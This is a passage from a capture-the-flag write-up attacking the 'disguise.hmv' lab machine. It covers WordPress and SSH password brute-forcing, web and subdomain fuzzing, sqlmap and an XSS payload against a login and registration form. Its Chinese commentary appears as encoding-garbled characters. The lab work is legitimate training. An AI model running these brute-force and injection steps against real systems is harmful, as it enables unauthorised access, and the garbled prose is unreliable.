    *   `CVE-2025-1305`: NewsBlogger &lt; 0.2.5.5 - CSRF to Arbitrary Plugin Installation.
    *   `CVE-2025-1304`: NewsBlogger &lt; 0.2.5.2 - Authenticated (Subscriber+) Arbitrary File Upload. ÔºàËøô‰∏™ÁúãËµ∑Êù•Êõ¥ÊúâÂà©Áî®‰ª∑ÂÄºÔºâ
*   ÂèëÁé∞Áî®Êà∑ `simpleadmin` (‰ª•Âèä `simpleAdmin`ÔºåÂèØËÉΩ‰∏∫Âêå‰∏ÄÁî®Êà∑)„ÄÇ

## 2.3 ÂØÜÁ†ÅÁàÜÁ†¥Â∞ùËØï (WordPress &amp; SSH)

Âü∫‰∫éÂèëÁé∞ÁöÑÁî®Êà∑ `simpleadmin`ÔºåÂ∞ùËØïÂØπÂÖ∂WordPressÂêéÂè∞ÂØÜÁ†ÅËøõË°åÁàÜÁ†¥„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ wpscan --url http://disguise.hmv -U simpleadmin -P /usr/share/wordlists/rockyou.txt --random-user-agent
```

ÂêåÊó∂ÔºåÂú®Âè¶‰∏Ä‰∏™ÁªàÁ´ØÁ™óÂè£Â∞ùËØïÁàÜÁ†¥SSHÊúçÂä°ÂØÜÁ†Å„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ hydra -l simpleadmin -P 5000q.txt ssh://192.168.205.211 -I -u -f -e nsr -t 64
```

ÁªèËøáÁ∫¶10ÂàÜÈíüÁöÑÁ≠âÂæÖÔºå‰∏§‰∏™ÁàÜÁ†¥ÂùáÊú™ÊàêÂäüÔºåÂà§Êñ≠ÂØÜÁ†ÅÁàÜÁ†¥ÁöÑË∑ØÂæÑÂèØËÉΩË°å‰∏çÈÄö„ÄÇ

## 2.4 WebÁõÆÂΩïÁàÜÁ†¥

Â∞ùËØï‰ΩøÁî®`gobuster`ÂØπ`http://disguise.hmv`ËøõË°åÁõÆÂΩïÁàÜÁ†¥Ôºå‰ª•ÂèëÁé∞ÂèØËÉΩÂ≠òÂú®ÁöÑÈöêËóèÈ°µÈù¢ÊàñËµÑÊ∫ê„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ gobuster dir -u http://disguise.hmv -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,md,html,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://disguise.hmv
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,php,txt,md,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/index.php            (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/]
/rss                  (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/feed/]
/login                (Status: 302) [Size: 0] [--&gt; http://disguise.hmv/wp-login.php]
/login.php            (Status: 302) [Size: 0] [--&gt; http://disguise.hmv/wp-login.php]
/0                    (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/0/]
/feed                 (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/feed/]
/atom                 (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/feed/atom/]
/s                    (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/sample-page/]
/wp-content           (Status: 301) [Size: 317] [--&gt; http://disguise.hmv/wp-content/]
/admin                (Status: 302) [Size: 0] [--&gt; http://disguise.hmv/wp-admin/]
/h                    (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/2025/04/01/hello-world/]
/wp-login.php         (Status: 200) [Size: 5275]
/rss2                 (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/feed/]
/license.txt          (Status: 200) [Size: 19903]
/wp-includes          (Status: 301) [Size: 318] [--&gt; http://disguise.hmv/wp-includes/]
/wp-register.php      (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/wp-login.php?action=register]
/S                    (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/sample-page/]
/wp-rss2.php          (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/feed/]
/H                    (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/2025/04/01/hello-world/]
/sa                   (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/sample-page/]
/rdf                  (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/feed/rdf/]
/page1                (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/]
Progress: 9864 / 1323360 (0.75%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 9882 / 1323360 (0.75%)
[ERROR] context canceled
[ERROR] context canceled
[ERROR] context canceled
===============================================================
Finished
===============================================================
```

ÁõÆÂΩïÁàÜÁ†¥ËøêË°åÁ∫¶2ÂàÜÈíüÂêéÔºåÂèëÁé∞Êâ´ÊèèÈÄüÂ∫¶ÈùûÂ∏∏ÁºìÊÖ¢ÔºåÊé®ÊµãWordPressÁ´ôÁÇπÂèØËÉΩÂ≠òÂú®WAFÊàñÂÖ∂‰ªñÈò≤Êä§Êú∫Âà∂„ÄÇÂÜ≥ÂÆöÊöÇÂÅúÊâ´ÊèèÔºåÂØªÊâæÂÖ∂‰ªñÁ™ÅÁ†¥Âè£„ÄÇ

# ‰∏â„ÄÅÁΩëÁªúÂ±ÇÈù¢‰ø°ÊÅØÂèëÊéò

## 3.1 IPv6Êé¢Êµã

Â∞ùËØï‰ªéIPv6Â±ÇÈù¢ËøõË°åÊé¢Êµã„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ping6 -I eth0 ff02::1
ping6: Warning: IPv6 link-local address on ICMP datagram socket may require ifname or scope-id =&gt; use: address%&lt;ifname|scope-id&gt;
ping6: Warning: source address might be selected on device other than: eth0
PING ff02::1 (ff02::1) from :: eth0: 56 data bytes
64 bytes from fe80::9ffa:901:c1:10b9%eth0: icmp_seq=1 ttl=64 time=0.112 ms
64 bytes from fe80::a00:27ff:feea:d3f5%eth0: icmp_seq=1 ttl=64 time=0.744 ms
64 bytes from fe80::9ffa:901:c1:10b9%eth0: icmp_seq=2 ttl=64 time=0.036 ms
64 bytes from fe80::a00:27ff:feea:d3f5%eth0: icmp_seq=2 ttl=64 time=0.322 ms
^C
--- ff02::1 ping statistics ---
2 packets transmitted, 2 received, +2 duplicates, 0% packet loss, time 1022ms
rtt min/avg/max/mdev = 0.036/0.303/0.744/0.275 ms
```

`ping6`ÂèëÁé∞‰∫Ü‰∏§‰∏™IPv6Êú¨Âú∞ÈìæË∑ØÂú∞ÂùÄ„ÄÇÂÖ∂‰∏≠ `fe80::a00:27ff:feea:d3f5%eth0` ÁöÑMACÂú∞ÂùÄ‰∏é‰πãÂâçIPv4Êâ´ÊèèÁöÑÁõÆÊ†á‰∏ªÊú∫MACÂú∞ÂùÄ `08:00:27:EA:D3:F5` Áõ∏Á¨¶ (EUI-64ËΩ¨Êç¢)„ÄÇ
ÂØπËøô‰∏§‰∏™IPv6Âú∞ÂùÄËøõË°å`nmap`Á´ØÂè£Êâ´Êèè„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ nmap -6 -p- fe80::9ffa:901:c1:10b9%eth0  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 22:41 EDT
Nmap scan report for fe80::9ffa:901:c1:10b9
Host is up (0.0000070s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 1.33 seconds
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ nmap -6 -p- fe80::a00:27ff:feea:d3f5%eth0
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 22:41 EDT
Nmap scan report for fe80::a00:27ff:feea:d3f5
Host is up (0.00011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:EA:D3:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds
```

ÂØπ‰∏éÁõÆÊ†áMACÂú∞ÂùÄ‰∏ÄËá¥ÁöÑIPv6Âú∞ÂùÄ `fe80::a00:27ff:feea:d3f5%eth0` ËøõË°åÊúçÂä°ÁâàÊú¨Êé¢Êµã„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ nmap -6 -sV -p22,80 fe80::a00:27ff:feea:d3f5%eth0
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 22:42 EDT
Nmap scan report for fe80::a00:27ff:feea:d3f5
Host is up (0.00032s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
MAC Address: 08:00:27:EA:D3:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.59 seconds
```

IPv6Êâ´ÊèèÁªìÊûú‰∏éIPv4‰∏ÄËá¥ÔºåÂºÄÊîæSSH (OpenSSH 7.9p1) Âíå HTTP (Apache 2.4.59) ÊúçÂä°„ÄÇ

## 3.2 ÊµÅÈáèÁõëÂê¨

‰ΩøÁî®`tcpdump`ÁõëÂê¨ÁõÆÊ†á‰∏ªÊú∫ `192.168.205.211` ÁöÑÁΩëÁªúÊµÅÈáèÔºåËßÇÂØüÊòØÂê¶ÊúâÂºÇÂ∏∏ÈÄö‰ø°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ sudo tcpdump -i eth0 host 192.168.205.211 -nn
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
22:44:40.505340 IP 192.168.205.211.41597 &gt; 162.159.200.1.123: NTPv4, Client, length 48
22:44:40.876037 ARP, Request who-has 192.168.205.211 tell 192.168.205.2, length 46
22:44:40.876365 ARP, Reply 192.168.205.211 is-at 08:00:27:ea:d3:f5, length 46
22:44:40.876419 IP 162.159.200.1.123 &gt; 192.168.205.211.41597: NTPv4, Server, length 48
22:44:45.642888 ARP, Request who-has 192.168.205.2 tell 192.168.205.211, length 46
22:44:45.642969 ARP, Reply 192.168.205.2 is-at 00:50:56:f4:ef:6f, length 46
^C
6 packets captured
6 packets received by filter
0 packets dropped by kernel
```

ÁªèËøáÁ∫¶1ÂàÜÈíüÁöÑÁõëÂê¨ÔºåÊçïËé∑Âà∞ÁöÑ‰∏ªË¶ÅÊòØNTPÂíåARPÊä•ÊñáÔºåÊú™ÂèëÁé∞Êúâ‰ª∑ÂÄºÁöÑ‰ø°ÊÅØ„ÄÇ

# Âõõ„ÄÅÂ≠êÂüüÂêçÁàÜÁ†¥‰∏éÂÖ≥ÈîÆÂèëÁé∞

## 4.1 FFUFÂ≠êÂüüÂêçÁàÜÁ†¥ (ÂàùËØï)

Â∞ÜÊ≥®ÊÑèÂäõËΩ¨ÂõûWebÂ±ÇÈù¢ÔºåÂ∞ùËØïËøõË°åÂ≠êÂüüÂêçÁàÜÁ†¥„ÄÇ‰ΩøÁî®`ffuf`Â∑•ÂÖ∑ÔºåÈÄöËøá‰øÆÊîπHostÂ§¥ÁöÑÊñπÂºèËøõË°åÊé¢Êµã„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ffuf -u http://disguise.hmv/ -H 'Host: FUZZ.disguise.hmv' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 -fw 11916

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://disguise.hmv/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.disguise.hmv
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 11916
________________________________________________

www                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 404ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

`ffuf`ÂèëÁé∞‰∫Ü‰∏Ä‰∏™Â≠êÂüüÂêç `www.disguise.hmv`„ÄÇÂ∞ÜÂÖ∂Ê∑ªÂä†Âà∞ `/etc/hosts` Êñá‰ª∂„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ sudo nano /etc/hosts

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

192.168.205.211 www.disguise.hmv disguise.hmv
```

‰ΩøÁî®`curl`Ê£ÄÊü• `www.disguise.hmv`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ curl -I http://www.disguise.hmv
HTTP/1.1 301 Moved Permanently
Date: Fri, 16 May 2025 02:53:06 GMT
Server: Apache/2.4.59 (Debian)
X-Redirect-By: WordPress
Location: http://disguise.hmv/
Content-Type: text/html; charset=UTF-8
```

ËØ•Â≠êÂüüÂêçÈÄöËøá301ÈáçÂÆöÂêëÂà∞‰∏ªÁ´ô `http://disguise.hmv/`ÔºåÊ≤°ÊúâÊèê‰æõÊñ∞ÁöÑÊîªÂáªÈù¢„ÄÇ

## 4.2 Gobuster DNSÊ®°ÂºèÂ≠êÂüüÂêçÁàÜÁ†¥

ËÄÉËôëÂà∞`ffuf`Êâ´ÊèèÈÄüÂ∫¶‰πüËæÉÊÖ¢ÔºåÂ∞ùËØï‰ΩøÁî®`gobuster`ÁöÑDNSÊ®°ÂºèËøõË°åÂ≠êÂüüÂêçÁàÜÁ†¥ÔºåÈ¶ñÂÖà‰ΩøÁî®Â§ßÂ≠óÂÖ∏„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ gobuster dns -d disguise.hmv -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     disguise.hmv
[+] Threads:    64
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: www.disguise.hmv

Progress: 3541 / 114442 (3.09%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 3553 / 114442 (3.10%)
===============================================================
Finished
===============================================================
```

`gobuster`‰ΩøÁî®Â§ßÂ≠óÂÖ∏Êó∂‰πü‰ªÖÂèëÁé∞‰∫Ü `www.disguise.hmv`„ÄÇÊõ¥Êç¢‰∏∫ËæÉÂ∞èÁöÑÂ≠óÂÖ∏ÂÜçÊ¨°Â∞ùËØï„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ gobuster dns -d disguise.hmv -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     disguise.hmv
[+] Threads:    64
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: www.disguise.hmv

Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================
```

Â∞èÂ≠óÂÖ∏Êâ´ÊèèÂÆåÊØïÔºå‰ªçÁÑ∂Âè™Êúâ `www.disguise.hmv`„ÄÇÊ≤°ÂäûÊ≥ï‰∫ÜÔºå‰πüÊ≤°ÂÖ∂‰ªñÁöÑË∑Ø‰∫ÜÔºåÁ°¨Êâ´Âêß„ÄÇÂÜçÊ¨°‰ΩøÁî®Â§ßÂ≠óÂÖ∏ËøõË°åÊâ´Êèè„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ gobuster dns -d disguise.hmv -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     disguise.hmv
[+] Threads:    64
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: www.disguise.hmv

Progress: 25708 / 114442 (22.46%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 25739 / 114442 (22.49%)
===============================================================
Finished
===============================================================
```

ËõôË∂£Ôºå‰∏çÂØπÂïäÔºå2wÂ§öÈÉΩÊ≤°Âá∫Êù•Ëøô‰πàÂ§∏Âº†ÔºüÁúãÁúãÂÖ∂‰ªñ‰∫∫ÁöÑwp„ÄÇÊìç.......Â•ΩÂÉèÊòØËΩØ‰ª∂ÈóÆÈ¢ò„ÄÇ

## 4.3 WfuzzÂ≠êÂüüÂêçÁàÜÁ†¥ (ËΩ¨Êú∫)

Êõ¥Êç¢‰∏∫`wfuzz`Â∑•ÂÖ∑ÔºåÂêåÊ†∑ÈÄöËøá‰øÆÊîπHostÂ§¥ÁöÑÊñπÂºèËøõË°åÂ≠êÂüüÂêçÁàÜÁ†¥„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ wfuzz -c -u 'http://disguise.hmv/' -H 'HOST:FUZZ.disguise.hmv' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 4602
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://disguise.hmv/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   301        0 L      0 W        0 Ch        'www - www'
000005051:   200        18 L     52 W       846 Ch      'dark - dark'
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 236.0730
Processed Requests: 8494
Filtered Requests: 8492
Requests/sec.: 35.98038
```

`wfuzz`ÊàêÂäüÁàÜÁ†¥Âá∫Êñ∞ÁöÑÂ≠êÂüüÂêç `dark.disguise.hmv`ÔºÅ

Ê≤âÈªòÊòØ‰ªäÊôöÁöÑÂ∫∑Ê°•„ÄÇ

Â∞ÜÊñ∞ÂèëÁé∞ÁöÑÂ≠êÂüüÂêç `dark.disguise.hmv` Ê∑ªÂä†Âà∞ `/etc/hosts` Êñá‰ª∂„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ sudo nano /etc/hosts
[sudo] password for kali:

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

192.168.205.211 www.disguise.hmv disguise.hmv dark.disguise.hmv
```

ËÆøÈóÆ `http://dark.disguise.hmv`„ÄÇ
![image-20250516110839064](https://7r1umphk.github.io/image/20250516110839497.webp)
È°µÈù¢ÊòæÁ§∫‰∏∫‰∏Ä‰∏™Âêç‰∏∫‚ÄúÊöóÈªëÂïÜÂ∫ó‚ÄùÁöÑÁ´ôÁÇπÔºåÈ£éÊ†ºÊúâÁÇπÁÇ´„ÄÇ

# ‰∫î„ÄÅÊöóÈªëÂïÜÂ∫ó (dark.disguise.hmv) Ê∏óÈÄèÊµãËØï

## 5.1 ÂàùÊ≠•Êé¢Á¥¢‰∏éÊ≥®ÂÜåÂäüËÉΩÂàÜÊûê

Êü•ÁúãÊñ∞Á´ôÁÇπÁöÑÈ°µÈù¢Ê∫êÁ†ÅÔºåÊú™ÂèëÁé∞ÊòéÊòæÂèØÂà©Áî®‰ø°ÊÅØ„ÄÇÂ∞ùËØï‰ΩøÁî®‰πãÂâçÂú®WordPressÁ´ôÁÇπÂèëÁé∞ÁöÑÁî®Êà∑Âêç `simpleAdmin` ËøõË°åÂº±ÂØÜÁ†ÅÁôªÂΩïÔºåÂ§±Ë¥•„ÄÇ
ËßÇÂØüÊ≥®ÂÜåÈ°µÈù¢ (register.php)ÔºåÂèëÁé∞ÂÖ∂Ë°®ÂçïÊèê‰∫§Êó∂Â≠òÂú®ÂâçÁ´ØJavaScriptÊ†°È™åÂáΩÊï∞ `validateForm`ÔºåËØ•ÂáΩÊï∞ÈôêÂà∂Áî®Êà∑ÂêçÈïøÂ∫¶‰∏çËÉΩË∂ÖËøá8‰∏™Â≠óÁ¨¶„ÄÇ

```javascript
// validateForm (ÈÉ®ÂàÜÁ§∫‰æã)
function validateForm() {
    var username = document.forms['register']['username'].value;
    if(username.length &gt; 8) {
        alert('Áî®Êà∑Âêç‰∏çËÉΩË∂ÖËøá8‰∏™Â≠óÁ¨¶');
        return false;
    }
    return true;
}
```

Áî±‰∫éÁõÆÊ†áÁî®Êà∑ `simpleAdmin` (11Â≠óÁ¨¶) ÈïøÂ∫¶Ë∂ÖËøá8‰ΩçÔºåËØ•ÂâçÁ´ØÊ†°È™å‰ºöÈòªÊ≠¢Ê≥®ÂÜå„ÄÇÂèØ‰ª•ÈÄöËøáÊµèËßàÂô®ÂºÄÂèëËÄÖÂ∑•ÂÖ∑Âà†Èô§Êàñ‰øÆÊîπÊ≠§JSÂáΩÊï∞Êù•ÁªïËøáÂâçÁ´ØÊ†°È™å„ÄÇ

È¶ñÂÖàÊ≥®ÂÜå‰∏Ä‰∏™ÊôÆÈÄöÁî®Êà∑ `admin`ÔºåÂØÜÁ†Å `111111`Ôºå‰ª•ÁÜüÊÇâÁ≥ªÁªüÂäüËÉΩ„ÄÇ
ÁôªÂΩïÂêéËøõÂÖ•‰∏™‰∫∫‰∏≠ÂøÉÈ°µÈù¢ (profile.php)„ÄÇ

```html
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;‰∏™‰∫∫‰∏≠ÂøÉ - ÊöóÈªëÂïÜÂ∫ó&lt;/title&gt;
    &lt;link rel='stylesheet' href='style3.css'&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;header&gt;
        &lt;h1&gt;ÊöóÈªëÂïÜÂ∫ó&lt;/h1&gt;
        &lt;nav&gt;
            &lt;span&gt;Ê¨¢Ëøé, admin
            &lt;/span&gt; |
            &lt;a href='index.php'&gt;È¶ñÈ°µ&lt;/a&gt; |
                        &lt;a href='logout.php'&gt;ÈÄÄÂá∫&lt;/a&gt;
        &lt;/nav&gt;
    &lt;/header&gt;

    &lt;div class='profile'&gt;
        &lt;h2&gt;‰∏™‰∫∫‰∏≠ÂøÉ&lt;/h2&gt;
        &lt;p&gt;Ê¨¢ËøéËÆøÈóÆÊÇ®ÁöÑ‰∏™‰∫∫‰∏ªÈ°µÔºåËøôÈáåÂèØ‰ª•Êü•ÁúãÂíåÁÆ°ÁêÜÊÇ®ÁöÑË¥¶Êà∑‰ø°ÊÅØ&lt;/p&gt;

            &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
```

È°µÈù¢Ê∫êÁ†Å‰æùÁÑ∂ÁÆÄÊ¥Å„ÄÇ‰ΩøÁî®BurpSuiteÊäìÂèñHTTPËØ∑Ê±ÇÔºåÂèëÁé∞ÁôªÂΩïÂêéÁöÑCookie‰∏≠ÂåÖÂê´‰∏Ä‰∏™Âêç‰∏∫ `dark_session` ÁöÑÂ≠óÊÆµÔºåÂÖ∂ÂÄºÁªèËøá‰∫ÜURLÁºñÁ†ÅÔºåÊú´Â∞æÁöÑ `%3D%3D` ÊöóÁ§∫ÂÖ∂ÂèØËÉΩÊòØBase64ÁºñÁ†Å„ÄÇ

```http
GET /profile.php HTTP/1.1
Host: dark.disguise.hmv
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://dark.disguise.hmv/login.php
Connection: keep-alive
Cookie: PHPSESSID=g31oqe3lpvnk3gd1obs5pmm4a0; dark_session=1mr9fHMuTh6J56IrZHP28w%3D%3D
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Ëøô `dark_session` ÁúãËµ∑Êù•ÊúâÁÇπÊú∫‰ºöÔºå‰ΩÜÁõÆÂâçÂ∞ö‰∏çÊ∏ÖÊ•öÂÖ∂ÂÖ∑‰Ωì‰ΩúÁî®„ÄÇ

## 5.2 SQLÊ≥®ÂÖ•‰∏éXSSÂ∞ùËØï

Âú®Ëøõ‰∏ÄÊ≠•ÂàÜÊûê `dark_session` ÂâçÔºåÂÖàÂ∞ùËØïÂ∏∏ËßÑÁöÑWebÊºèÊ¥ûÊµãËØï„ÄÇ
‰ΩøÁî®`sqlmap`ÂØπÁôªÂΩïË°®Âçï (login.php) ËøõË°åSQLÊ≥®ÂÖ•Ê£ÄÊµã„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ sqlmap -u 'http://dark.disguise.hmv/login.php' --forms --batch --level=3 --risk=3
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.4#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:42:55 /2025-05-15/

[23:42:55] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=e2744i2rksa...aqbikf4hhl'). Do you want to use those [Y/n] Y
[23:42:55] [INFO] searching for forms
[1/1] Form:
POST http://dark.disguise.hmv/login.php
POST data: username=&amp;password=
do you want to test this form? [Y/n/q]
&gt; Y
Edit POST data [default: username=&amp;password=] (Warning: blank fields detected): username=&amp;password=
do you want to fill blank fields with random values? [Y/n] Y
# ... (Â§ßÈáèsqlmapÊé¢ÊµãËøáÁ®ãËæìÂá∫) ...
[23:43:21] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
[23:43:21] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-05152025_1142pm.csv'

[*] ending @ 23:43:21 /2025-05-15/
```

SqlmapÊú™ÂèëÁé∞SQLÊ≥®ÂÖ•ÊºèÊ¥û„ÄÇ
Â∞ùËØïÂú®Ê≥®ÂÜåÁî®Êà∑ÂêçÁöÑ‰ΩçÁΩÆËæìÂÖ•XSS payload `&lt;script&gt;alert(document.domain)&lt;/script&gt;`ÔºåÂØÜÁ†Å `111111`„ÄÇÁôªÂΩïÂêéÂèëÁé∞ÁâπÊÆäÂ≠óÁ¨¶ `&lt;` Âíå `&gt;` Ë¢´HTMLÂÆû‰ΩìÁºñÁ†ÅÔºåXSSÂ∞ùËØïÂ§±Ë¥•„ÄÇ

## 5.3 Cookie (`dark_session`) ÂàÜÊûê‰∏é‰º™ÈÄ† (ECB Oracle Padding Attack)

ÈáçÁÇπÂàÜÊûê `dark_session` Cookie„ÄÇ
‰ª•Áî®Êà∑ `admin` (ÂØÜÁ†Å `111111`) ÁôªÂΩïÂêéËé∑ÂèñÁöÑ `dark_session` ‰∏∫ `1mr9fHMuTh6J56IrZHP28w%3D%3D`„ÄÇ
‰ΩøÁî®CyberChefËøõË°åURLËß£Á†ÅÔºåÂæóÂà∞ `1mr9fHMuTh6J56IrZHP28w==`„ÄÇ
